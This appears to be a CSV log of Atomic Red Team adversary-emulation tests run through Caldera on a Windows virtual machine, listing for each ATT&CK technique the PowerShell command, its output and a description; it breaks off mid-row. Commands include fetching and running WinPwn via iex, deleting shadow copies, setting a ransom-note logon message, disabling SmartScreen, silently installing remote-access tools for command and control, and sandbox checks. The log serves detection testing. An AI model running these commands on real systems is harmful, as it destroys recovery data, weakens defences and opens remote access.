238,Initial-Success,discovery,discovery :: Software Discovery,discovery :: ['Applications Installed'],discovery :: T1518,operation__atomic_windows_depfalse_pshtrue__t1518__discovery__software_discovery__b5fe84fa9fb8216512867a039a61db20__SAVED_2024-03-08_152539,atomic_windows_depfalse_pshtrue__t1518__discovery__software_discovery__b5fe84fa9fb8216512867a039a61db20,['b5fe84fa9fb8216512867a039a61db20'],1,0,1,[1],['DisplayName                                                    DisplayVersion Publisher                  InstallDate-----------                                                    -------------- ---------                  -----------                                                                                                                                                                                                                                        Microsoft Update Health Tools                                  3.74.0.0       Microsoft Corporation      20231101   Python 3.9.0 pip Bootstrap (64-bit)                            3.9.150.0      Python Software Foundation 20201120   Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29334 14.28.29334    Microsoft Corporation      20201121   Python 3.9.0 Utility Scripts (64-bit)                          3.9.150.0      Python Software Foundation 20201120   Python 3.9.0 Documentation (64-bit)                            3.9.150.0      Python Software Foundation 20201120   Python 3.9.0 Standard Library (64-bit)                         3.9.150.0      Python Software Foundation 20201120   Python 3.9.0 Tcl/Tk Support (64-bit)                           3.9.150.0      Python Software Foundation 20201120   Python 3.9.0 Add to Path (64-bit)                              3.9.150.0      Python Software Foundation 20201120   Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.28.29334    14.28.29334    Microsoft Corporation      20201121   Python 3.9.0 Test Suite (64-bit)                               3.9.150.0      Python Software Foundation 20201120   Python 3.9.0 Core Interpreter (64-bit)                         3.9.150.0      Python Software Foundation 20201120   Python 2.7.18 (64-bit)                                         2.7.18150      Python Software Foundation 20201120   Python 3.9.0 Executables (64-bit)                              3.9.150.0      Python Software Foundation 20201120   Update for Windows 10 for x64-based Systems (KB5001716)        8.92.0.0       Microsoft Corporation      20231011   Python 3.9.0 Development Libraries (64-bit)                    3.9.150.0      Python Software Foundation 20201120   DisplayName                                                        DisplayVersion Publisher                  InstallDat                                                                                                             e         -----------                                                        -------------- ---------                  ----------                                                                                                                       Microsoft Edge                                                     122.0.2365.66  Microsoft Corporation      20240304  Microsoft Edge Update                                              1.3.185.21                                          Microsoft Edge WebView2 Runtime                                    122.0.2365.66  Microsoft Corporation      20240304                                                                                                                         Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.28.29334        14.28.29334    Microsoft Corporation      20201121  Microsoft Visual C++ 2019 X86 Additional Runtime - 14.28.29334     14.28.29334    Microsoft Corporation      20201121  Microsoft Visual C++ 2015-2019 Redistributable (x64) - 14.28.29334 14.28.29334.0  Microsoft Corporation                Microsoft Visual C++ 2015-2019 Redistributable (x86) - 14.28.29334 14.28.29334.0  Microsoft Corporation                Python Launcher                                                    3.9.7217.0     Python Software Foundation 20201120  Windows SDK AddOn                                                  10.1.0.0       Microsoft Corporation      20201121  '],[''],['0'],"['Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize; Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize']",['Query the registry to determine software and versions installed on the system. Upon execution a table of\nsoftware name and version information will be displayed.\n'],['Applications Installed'],"[{'tactic': 'discovery', 'technique_name': 'Software Discovery', 'technique_id': 'T1518'}]",['windows'],['psh']
239,Initial-Success,discovery,discovery :: Software Discovery,discovery :: ['WinPwn - DotNet'],discovery :: T1518,operation__atomic_windows_depfalse_pshtrue__t1518__discovery__software_discovery__0954576f69ca8e140f2cdc9e58b36ff9__SAVED_2024-03-08_151228,atomic_windows_depfalse_pshtrue__t1518__discovery__software_discovery__0954576f69ca8e140f2cdc9e58b36ff9,['0954576f69ca8e140f2cdc9e58b36ff9'],1,0,1,[1],['-------> Searching for .NET Services on this system:Name         : NetTcpPortSharingPath         : C:\\WINDOWS\\Microsoft.NET\\Framework64\\v4.0.30319\\SMSvcHost.exeCommandLine  : C:\\WINDOWS\\Microsoft.NET\\Framework64\\v4.0.30319\\SMSvcHost.exeUser         : NT AUTHORITY\\LocalServiceStartMode    : DisabledDescription  : Provides ability to share TCP ports over the net.tcp protocol.DisplayName  : Net.Tcp Port Sharing ServiceState        : StoppedTriggerCount : 0Name         : SilkServicePath         : C:\\Users\\puma-4\\Downloads\\SilkETW_SilkService_v8\\v8\\SilkService\\SilkService.exeCommandLine  : C:\\Users\\puma-4\\Downloads\\SilkETW_SilkService_v8\\v8\\SilkService\\SilkService.exeUser         : LocalSystemStartMode    : ManualDescription  : DisplayName  : SilkServiceState        : RunningTriggerCount : 0'],[''],['0'],"[""$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); dotnet -consoleoutput -noninteractive""]",['Search for .NET Service-Binaries on this system via winpwn dotnet function of WinPwn.'],['WinPwn - DotNet'],"[{'tactic': 'discovery', 'technique_name': 'Software Discovery', 'technique_id': 'T1518'}]",['windows'],['psh']
241,Initial-Success,discovery,discovery :: Software Discovery: Security Software Discovery,discovery :: ['Security Software Discovery - powershell'],discovery :: T1518.001,operation__atomic_windows_depfalse_pshtrue__t1518_001__discovery__software_discovery-_security_software_discovery__e922717a38fc8806bc9b56b111b999ff__SAVED_2024-03-08_150553,atomic_windows_depfalse_pshtrue__t1518_001__discovery__software_discovery-_security_software_discovery__e922717a38fc8806bc9b56b111b999ff,['e922717a38fc8806bc9b56b111b999ff'],1,0,1,[1],['Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                  -------  ------    -----      -----     ------     --  -- -----------                                                      396      22     7756      22772       0.05   3880   1 smartscreen                                                  '],[''],['0'],"['get-process | ?{$_.Description -like ""*virus*""}; get-process | ?{$_.Description -like ""*carbonblack*""}; get-process | ?{$_.Description -like ""*defender*""}; get-process | ?{$_.Description -like ""*cylance*""}; get-process | ?{$_.Description -like ""*mc*""}; get-process | ?{$_.ProcessName -like ""*mc*""}; get-process | Where-Object { $_.ProcessName -eq ""Sysmon"" }']","['Methods to identify Security Software on an endpoint\n\nwhen sucessfully executed, powershell is going to processes related AV products if they are running.\nNote that, depending on the privilege of current user, get-process | ?{$_.Description -like ""*""} may not return the processes related to AV products of the check.\nFor instance, only with Administrator right, you can see the process description of McAffee processes. Hence, it is better to use get-process | ?{$_.ProcessName -like ""*""},\nif you know the name of those processes.\n']",['Security Software Discovery - powershell'],"[{'tactic': 'discovery', 'technique_name': 'Software Discovery: Security Software Discovery', 'technique_id': 'T1518.001'}]",['windows'],['psh']
242,Initial-Success,discovery,discovery :: Software Discovery: Security Software Discovery,discovery :: ['Security Software Discovery - Windows Defender Enumeration'],discovery :: T1518.001,operation__atomic_windows_depfalse_pshtrue__t1518_001__discovery__software_discovery-_security_software_discovery__d8dbc446fea6514a712803194b10cb75__SAVED_2024-03-08_145915,atomic_windows_depfalse_pshtrue__t1518_001__discovery__software_discovery-_security_software_discovery__d8dbc446fea6514a712803194b10cb75,['d8dbc446fea6514a712803194b10cb75'],1,0,1,[1],['Status   Name               DisplayName                           ------   ----               -----------                           Running  WinDefend          Microsoft Defender Antivirus Service  AMEngineVersion                  : 1.1.24020.9AMProductVersion                 : 4.18.24010.12AMRunningMode                    : NormalAMServiceEnabled                 : TrueAMServiceVersion                 : 4.18.24010.12AntispywareEnabled               : TrueAntispywareSignatureAge          : 1AntispywareSignatureLastUpdated  : 3/7/2024 3:27:33 AMAntispywareSignatureVersion      : 1.407.24.0AntivirusEnabled                 : TrueAntivirusSignatureAge            : 1AntivirusSignatureLastUpdated    : 3/7/2024 3:27:33 AMAntivirusSignatureVersion        : 1.407.24.0BehaviorMonitorEnabled           : FalseComputerID                       : D1EE347B-1999-4316-9B3D-47721D14AFC3ComputerState                    : 0DefenderSignaturesOutOfDate      : FalseDeviceControlDefaultEnforcement  : DeviceControlPoliciesLastUpdated : 10/11/2023 5:40:51 PMDeviceControlState               : DisabledFullScanAge                      : 4294967295FullScanEndTime                  : FullScanOverdue                  : FalseFullScanRequired                 : FalseFullScanSignatureVersion         : FullScanStartTime                : InitializationProgress           : ServiceStartedSuccessfullyIoavProtectionEnabled            : FalseIsTamperProtected                : FalseIsVirtualMachine                 : TrueLastFullScanSource               : 0LastQuickScanSource              : 2NISEnabled                       : FalseNISEngineVersion                 : 0.0.0.0NISSignatureAge                  : 65535NISSignatureLastUpdated          : NISSignatureVersion              : OnAccessProtectionEnabled        : FalseProductStatus                    : 524288QuickScanAge                     : 3QuickScanEndTime                 : 3/4/2024 4:44:36 PMQuickScanOverdue                 : FalseQuickScanSignatureVersion        : 1.405.1052.0QuickScanStartTime               : 3/4/2024 4:44:05 PMRealTimeProtectionEnabled        : FalseRealTimeScanDirection            : 0RebootRequired                   : FalseSmartAppControlExpiration        : SmartAppControlState             : OffTamperProtectionSource           : UITDTCapable                       : N/ATDTMode                          : N/ATDTSiloType                      : N/ATDTStatus                        : N/ATDTTelemetry                     : N/ATroubleShootingDailyMaxQuota     : TroubleShootingDailyQuotaLeft    : TroubleShootingEndTime           : TroubleShootingExpirationLeft    : TroubleShootingMode              : TroubleShootingModeSource        : TroubleShootingQuotaResetTime    : TroubleShootingStartTime         : PSComputerName                   : CategoryID       : 27DidThreatExecute : TrueIsActive         : FalseResources        : RollupStatus     : 65SchemaVersion    : 1.0.0.0SeverityID       : 1ThreatID         : 227064ThreatName       : PUA:Win32/SpigotTypeID           : 0PSComputerName   : '],[''],['0'],['Get-Service WinDefend; Get-MpComputerStatus; Get-MpThreat'],"['Windows Defender Enumeration via different built-in windows native tools.\nwhen sucessfully executed, information about windows defender is displayed.\n']",['Security Software Discovery - Windows Defender Enumeration'],"[{'tactic': 'discovery', 'technique_name': 'Software Discovery: Security Software Discovery', 'technique_id': 'T1518.001'}]",['windows'],['psh']
247,Initial-Success,multiple,multiple :: Virtualization/Sandbox Evasion: System Checks,multiple :: ['Detect Virtualization Environment (Windows)'],multiple :: T1497.001,"operation__atomic_windows_depfalse_pshtrue__t1497_001__multiple__virtualization,sandbox_evasion-_system_checks__e9e69b4fedb8e40d634865ce9a3192dc__SAVED_2024-03-08_142620","atomic_windows_depfalse_pshtrue__t1497_001__multiple__virtualization,sandbox_evasion-_system_checks__e9e69b4fedb8e40d634865ce9a3192dc",['e9e69b4fedb8e40d634865ce9a3192dc'],1,0,1,[1],['Virtualization Environment detected'],[''],['0'],"['$error.clear(); Get-WmiObject -Query ""SELECT * FROM MSAcpi_ThermalZoneTemperature"" -ErrorAction SilentlyContinue; if($error) {echo ""Virtualization Environment detected""}']","['Windows Management Instrumentation(WMI) objects contains system information which helps to detect virtualization. This command will specifically attempt to get the CurrentTemperature value from this object and will check to see if the attempt results in an error that contains the word supported. This is meant to find the result of Not supported, which is the result if run in a virtual machine\n']",['Detect Virtualization Environment (Windows)'],"[{'tactic': 'multiple', 'technique_name': 'Virtualization/Sandbox Evasion: System Checks', 'technique_id': 'T1497.001'}]",['windows'],['psh']
248,Initial-Success,multiple,multiple :: Virtualization/Sandbox Evasion: System Checks,multiple :: ['Detect Virtualization Environment via WMI Manufacturer/Model Listing (Windows)'],multiple :: T1497.001,"operation__atomic_windows_depfalse_pshtrue__t1497_001__multiple__virtualization,sandbox_evasion-_system_checks__64ccf7cd4358a0540ab51c8015c1b744__SAVED_2024-03-08_141944","atomic_windows_depfalse_pshtrue__t1497_001__multiple__virtualization,sandbox_evasion-_system_checks__64ccf7cd4358a0540ab51c8015c1b744",['64ccf7cd4358a0540ab51c8015c1b744'],1,0,1,[1],['No virtualization environment detected!'],[''],['0'],"['$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty ""Manufacturer""; $Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty ""Model""; if((($Manufacturer.ToLower() -eq ""microsoft corporation"") -and ($Model.ToLower().contains(""virtual""))) -or ($Manufacturer.ToLower().contains(""vmware"")) -or ($Model.ToLower() -eq ""virtualbox"")) {write-host ""Virtualization environment detected!""} else {write-host ""No virtualization environment detected!""}']","['Windows Management Instrumentation(WMI) objects contain system information which helps to detect virtualization. This test will get the model and manufacturer of the machine to determine if it is a virtual machine, such as through VMware or VirtualBox. \n']",['Detect Virtualization Environment via WMI Manufacturer/Model Listing (Windows)'],"[{'tactic': 'multiple', 'technique_name': 'Virtualization/Sandbox Evasion: System Checks', 'technique_id': 'T1497.001'}]",['windows'],['psh']
249,Initial-Success,impact,impact :: Defacement: Internal Defacement,impact :: ['Configure LegalNoticeCaption and LegalNoticeText registry keys to display ransom message'],impact :: T1491.001,operation__atomic_windows_depfalse_pshtrue__t1491_001__impact__defacement-_internal_defacement__2fc2e45dde68ab78a97a22ca138652e1__SAVED_2024-03-08_140637,atomic_windows_depfalse_pshtrue__t1491_001__impact__defacement-_internal_defacement__2fc2e45dde68ab78a97a22ca138652e1,['2fc2e45dde68ab78a97a22ca138652e1'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['$orgLegalNoticeCaption = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeCaption).LegalNoticeCaption; $orgLegalNoticeText = (Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeText).LegalNoticeText; $newLegalNoticeCaption = ""PYSA""; $newLegalNoticeText = ""Hi Company, every byte on any types of your devices was encrypted. Don\'t try to use backups because it were encrypted too. To get all your data contact us:xxxx@onionmail.org""; Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeCaption -Value $newLegalNoticeCaption -Type String -Force; Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name LegalNoticeText -Value $newLegalNoticeText -Type String -Force']","['Display ransom message to users at system start-up by configuring registry keys HKLM\\SOFTWARE\\Micosoft\\Windows\\CurrentVersion\\Policies\\System\\LegalNoticeCaption and HKLM\\SOFTWARE\\Micosoft\\Windows\\CurrentVersion\\Policies\\System\\LegalNoticeText.\n\n[SynAck Ransomware](https://www.trendmicro.com/vinfo/es/security/news/cybercrime-and-digital-threats/synack-ransomware-leverages-process-doppelg-nging-for-evasion-and-infection), \n[Grief Ransomware](https://redcanary.com/blog/grief-ransomware/), \n[Maze Ransomware](https://cyware.com/research-and-analysis/maze-ransomware-a-deadly-combination-of-data-theft-and-encryption-to-target-us-organizations-8f27),\n[Pysa Ransomware](https://www.cybereason.com/blog/research/threat-analysis-report-inside-the-destructive-pysa-ransomware),\n[Spook Ransomware](https://community.fortinet.com/t5/FortiEDR/Threat-Coverage-How-FortiEDR-protects-against-Spook-Ransomware/ta-p/204226),\n[DopplePaymer Ransomware](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Win32/Dopplepaymer&threatId=-2147221958),\n[Reedemer Ransomware](https://blog.cyble.com/2022/07/20/redeemer-ransomware-back-action/),\n[Kangaroo Ransomware](https://www.bleepingcomputer.com/news/security/the-kangaroo-ransomware-not-only-encrypts-your-data-but-tries-to-lock-you-out-of-windows/)\n']",['Configure LegalNoticeCaption and LegalNoticeText registry keys to display ransom message'],"[{'tactic': 'impact', 'technique_name': 'Defacement: Internal Defacement', 'technique_id': 'T1491.001'}]",['windows'],['psh']
250,Initial-Success,impact,impact :: Inhibit System Recovery,impact :: ['Windows - Delete Volume Shadow Copies via WMI with PowerShell'],impact :: T1490,operation__atomic_windows_depfalse_pshtrue__t1490__impact__inhibit_system_recovery__e90756bb6dcd21462dc4cc452661df91__SAVED_2024-03-08_140001,atomic_windows_depfalse_pshtrue__t1490__impact__inhibit_system_recovery__e90756bb6dcd21462dc4cc452661df91,['e90756bb6dcd21462dc4cc452661df91'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}'],"['Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject.\nThis technique is used by numerous ransomware families such as Sodinokibi/REvil.\nExecutes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution\nthere may be no output displayed.\n']",['Windows - Delete Volume Shadow Copies via WMI with PowerShell'],"[{'tactic': 'impact', 'technique_name': 'Inhibit System Recovery', 'technique_id': 'T1490'}]",['windows'],['psh']
251,Initial-Success,impact,impact :: Inhibit System Recovery,impact :: ['Windows - vssadmin Resize Shadowstorage Volume'],impact :: T1490,operation__atomic_windows_depfalse_pshtrue__t1490__impact__inhibit_system_recovery__409acf7907007b041753a5f452b3df9b__SAVED_2024-03-08_135325,atomic_windows_depfalse_pshtrue__t1490__impact__inhibit_system_recovery__409acf7907007b041753a5f452b3df9b,['409acf7907007b041753a5f452b3df9b'],1,0,1,[1],['vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool(C) Copyright 2001-2013 Microsoft Corp.Successfully resized the shadow copy storage association'],[''],['0'],['vssadmin resize shadowstorage /For=C: /On=C: /MaxSize=20%'],['Adversaries generally try to Resize Shadowstorage Volume using vssadmin.exe to avoid the shadow volumes being made again. This technique is typically found used by adversaries during a ransomware event and a precursor to deleting the shadowstorage.'],['Windows - vssadmin Resize Shadowstorage Volume'],"[{'tactic': 'impact', 'technique_name': 'Inhibit System Recovery', 'technique_id': 'T1490'}]",['windows'],['psh']
254,Initial-Success,multiple,multiple :: Domain Policy Modification: Group Policy Modification,multiple :: ['LockBit Black - Modify Group policy settings -Powershell'],multiple :: T1484.001,operation__atomic_windows_depfalse_pshtrue__t1484_001__multiple__domain_policy_modification-_group_policy_modification__5e0427f03faf554046c6a29864087b49__SAVED_2024-03-08_133344,atomic_windows_depfalse_pshtrue__t1484_001__multiple__domain_policy_modification-_group_policy_modification__5e0427f03faf554046c6a29864087b49,['5e0427f03faf554046c6a29864087b49'],1,0,1,[1],['GroupPolicyRefreshTimeDC : 0PSPath                   : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\S                           ystemPSParentPath             : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsPSChildName              : SystemPSDrive                  : HKLMPSProvider               : Microsoft.PowerShell.Core\\RegistryGroupPolicyRefreshTimeOffsetDC : 0PSPath                         : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Win                                 dows\\SystemPSParentPath                   : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Win                                 dowsPSChildName                    : SystemPSDrive                        : HKLMPSProvider                     : Microsoft.PowerShell.Core\\RegistryGroupPolicyRefreshTime : 0PSPath                 : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Sys                         temPSParentPath           : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsPSChildName            : SystemPSDrive                : HKLMPSProvider             : Microsoft.PowerShell.Core\\RegistryGroupPolicyRefreshTimeOffset : 0PSPath                       : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windo                               ws\\SystemPSParentPath                 : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windo                               wsPSChildName                  : SystemPSDrive                      : HKLMPSProvider                   : Microsoft.PowerShell.Core\\RegistryEnableSmartScreen : 0PSPath            : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\SystemPSParentPath      : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsPSChildName       : SystemPSDrive           : HKLMPSProvider        : Microsoft.PowerShell.Core\\RegistryShellSmartScreenLevel : PSPath                : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Syst                        emPSParentPath          : Microsoft.PowerShell.Core\\Registry::HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\WindowsPSChildName           : SystemPSDrive               : HKLMPSProvider            : Microsoft.PowerShell.Core\\Registry'],[''],['0'],"['New-ItemProperty ""HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System"" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force; New-ItemProperty ""HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System"" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force; New-ItemProperty ""HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System"" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force; New-ItemProperty ""HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System"" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force; New-ItemProperty ""HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System"" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force; New-ItemProperty ""HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System"" -Name ShellSmartScreenLevel -Force']",['An adversary modifies group policy settings\n'],['LockBit Black - Modify Group policy settings -Powershell'],"[{'tactic': 'multiple', 'technique_name': 'Domain Policy Modification: Group Policy Modification', 'technique_id': 'T1484.001'}]",['windows'],['psh']
259,Initial-Success,command-and-control,command-and-control :: Remote Access Software,command-and-control :: ['LogMeIn Files Detected Test on Windows'],command-and-control :: T1219,operation__atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__f1b3fca18d7465cd10e5a7477a3bf97d__SAVED_2024-03-08_130054,atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__f1b3fca18d7465cd10e5a7477a3bf97d,['f1b3fca18d7465cd10e5a7477a3bf97d'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi; $file1 = ""C:\\Users\\"" + $env:username + ""\\Desktop\\LogMeInIgnition.msi""; Start-Process -Wait $file1 /quiet; Start-Process \'C:\\Program Files (x86)\\LogMeIn Ignition\\LMIIgnition.exe\' ""/S""']",['An adversary may attempt to trick the user into downloading LogMeIn and use to establish C2. Download of LogMeIn installer will be at the destination location and ran when sucessfully executed.\n'],['LogMeIn Files Detected Test on Windows'],"[{'tactic': 'command-and-control', 'technique_name': 'Remote Access Software', 'technique_id': 'T1219'}]",['windows'],['psh']
262,Initial-Success,command-and-control,command-and-control :: Remote Access Software,command-and-control :: ['GoToAssist Files Detected Test on Windows'],command-and-control :: T1219,operation__atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__b6ebae300e5ff115e965cc9179d4f831__SAVED_2024-03-08_051519,atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__b6ebae300e5ff115e965cc9179d4f831,['b6ebae300e5ff115e965cc9179d4f831'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Downloads\\GoToAssist.exe ""https://launch.getgo.com/launcher2/helper?token=e0-FaCddxmtMoX8_cY4czssnTeGvy83ihp8CLREfvwQshiBW0_RcbdoaEp8IA-Qn8wpbKlpGIflS-39gW6RuWRM-XHwtkRVMLBsp5RSKp-a3PBM-Pb1Fliy73EDgoaxr-q83WtXbLKqD7-u3cfDl9gKsymmhdkTGsXcDXir90NqKj92LsN_KpyYwV06lIxsdRekhNZjNwhkWrBa_hG8RQJqWSGk6tkZLVMuMufmn37eC2Cqqiwq5bCGnH5dYiSUUsklSedRLjh4N46qPYT1bAU0qD25ZPr-Kvf4Kzu9bT02q3Yntj02ZA99TxL2-SKzgryizoopBPg4Ilfo5t78UxKTYeEwo4etQECfkCRvenkTRlIHmowdbd88zz7NiccXnbHJZehgs6_-JSVjQIdPTXZbF9T5z44mi4BQYMtZAS3DE86F0C3D4Tcd7fa5F6Ve8rQWt7pvqFCYyiJAailslxOw0LsGyFokoy65tMF980ReP8zhVcTKYP8s8mhGXihUQJQPNk20Sw&downloadTrigger=restart&renameFile=1""; $file1 = ""C:\\Users\\"" + $env:username + ""\\Downloads\\GoToAssist.exe""; Start-Process $file1 /S;']",['An adversary may attempt to trick the user into downloading GoToAssist and use to establish C2. Download of GoToAssist installer will be at the destination location and ran when sucessfully executed.\n'],['GoToAssist Files Detected Test on Windows'],"[{'tactic': 'command-and-control', 'technique_name': 'Remote Access Software', 'technique_id': 'T1219'}]",['windows'],['psh']
263,Initial-Success,command-and-control,command-and-control :: Remote Access Software,command-and-control :: ['AnyDesk Files Detected Test on Windows'],command-and-control :: T1219,operation__atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__aada5380e7d0a4c7b71f2a324d9d5327__SAVED_2024-03-08_050433,atomic_windows_depfalse_pshtrue__t1219__command-and-control__remote_access_software__aada5380e7d0a4c7b71f2a324d9d5327,['aada5380e7d0a4c7b71f2a324d9d5327'],1,1,0,[0],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],['N/A Caldera Link-Output (Possible/Valid Case)'],"['Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe; $file1 = ""C:\\Users\\"" + $env:username + ""\\Desktop\\AnyDesk.exe""; Start-Process $file1 /S;']",['An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.\n'],['AnyDesk Files Detected Test on Windows'],"[{'tactic': 'command-and-control', 'technique_name': 'Remote Access Software', 'technique_id': 'T1219'}]",['windows'],['psh']
270,Initial-Success,defense-evasion,defense-evasion :: Signed Binary Proxy Execution,defense-evasion :: ['LOLBAS CustomShellHost to Spawn Process'],defense-evasion :: T1218,operation__atomic_windows_depfalse_pshtrue__t1218__defense-evasion__signed_binary_proxy_execution__51ef5578afcd873709d2c7672234e57b__SAVED_2024-03-08_033805,atomic_windows_depfalse_pshtrue__t1218__defense-evasion__signed_binary_proxy_execution__51ef5578afcd873709d2c7672234e57b,['51ef5578afcd873709d2c7672234e57b'],1,0,1,[1],['    Directory: C:\\Mode                 LastWriteTime         Length Name                                                                 ----                 -------------         ------ ----                                                                 d-----          3/8/2024   3:35 AM                test                                                                 '],[''],['0'],"['if (-not (Test-Path C:\\test)) {; New-Item -Path C:\\test -ItemType Directory; } else {; Write-Host ""Directory C:\\test already exists."" }; Copy-Item -Path ""C:\\windows\\system32\\customshellhost.exe"" -Destination ""C:\\test\\customshellhost.exe"" -Force; Copy-Item -Path ""C:\\windows\\system32\\calc.exe"" -Destination ""C:\\test\\explorer.exe"" -Force; C:\\test\\customshellhost.exe']","['This test simulates an adversary copying `customshellhost.exe` and `calc.exe` from `C:\\windows\\system32\\` to `C:\\temp\\`, renaming `calc.exe` to `explorer.exe`.\nUpon execution, customshellhost.exe will spawn calc.exe.\nNote this will only work on Windows 10 or 11.\n[LOLBAS](https://lolbas-project.github.io/lolbas/Binaries/CustomShellHost/)\n[BishopFox](https://bishopfox.com/blog/edr-bypass-with-lolbins)\n']",['LOLBAS CustomShellHost to Spawn Process'],"[{'tactic': 'defense-evasion', 'technique_name': 'Signed Binary Proxy Execution', 'technique_id': 'T1218'}]",['windows'],['psh']
272,Initial-Success,defense-evasion,defense-evasion :: Signed Binary Proxy Execution: Regsvcs/Regasm,defense-evasion :: ['Regsvcs Uninstall Method Call Test'],defense-evasion :: T1218.009,"operation__atomic_windows_depfalse_pshtrue__t1218_009__defense-evasion__signed_binary_proxy_execution-_regsvcs,regasm__78931aaa8e328d30a3e47f61e2899b3b__SAVED_2024-03-08_031039","atomic_windows_depfalse_pshtrue__t1218_009__defense-evasion__signed_binary_proxy_execution-_regsvcs,regasm__78931aaa8e328d30a3e47f61e2899b3b",['78931aaa8e328d30a3e47f61e2899b3b'],1,0,1,[1],"[""Microsoft (R) Visual C# Compiler version 4.8.4084.0\rfor C# 5Copyright (C) Microsoft Corporation. All rights reserved.\r\rThis compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240Microsoft (R) .NET Framework Services Installation Utility Version 4.8.4084.0Copyright (C) Microsoft Corporation.  All rights reserved.I shouldn't really executeWARNING: The assembly does not declare an ApplicationAccessControl Attribute.  Application security will be enabled by default.Installed Assembly:\tAssembly: C:\\Users\\puma-4\\AppData\\Local\\Temp\\T1218.009.dll\tApplication: T1218.009\tTypeLib: C:\\Users\\puma-4\\AppData\\Local\\Temp\\T1218.009.tlb""]",[''],['0'],"['$key = 